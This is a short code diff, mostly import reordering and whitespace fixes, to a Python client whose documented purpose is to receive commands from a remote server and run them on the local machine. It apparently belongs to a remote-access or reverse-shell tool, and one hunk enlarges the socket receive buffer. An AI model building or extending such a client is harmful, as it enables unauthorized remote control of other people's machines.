@@ -1,13 +1,14 @@
 import os
-import socket
-import requests
-import subprocess
-import time
+import pathlib
 import shutil
 import signal
-import sys
+import socket
 import struct
-import pathlib
+import subprocess
+import sys
+import time
+
+import requests
 from cryptography.fernet import Fernet
 
 commands = '\nAvaliable Modules\n'
@@ -149,7 +150,7 @@ class Client(object):
     def receive_commands(self):
         """ Receive commands from remote server and run on local machine """
         try:
-            self.socket.recv(10)
+            self.socket.recv(1024)
         except Exception as e:
             print('Could not start communication with server: %s\n' %str(e))
             return
@@ -203,7 +204,7 @@ def main():
             print("Error on socket connections: %s" %str(e))
             time.sleep(5)     
         else:
-            break    
+            break
     try:
         client.receive_commands()
     except Exception as e:
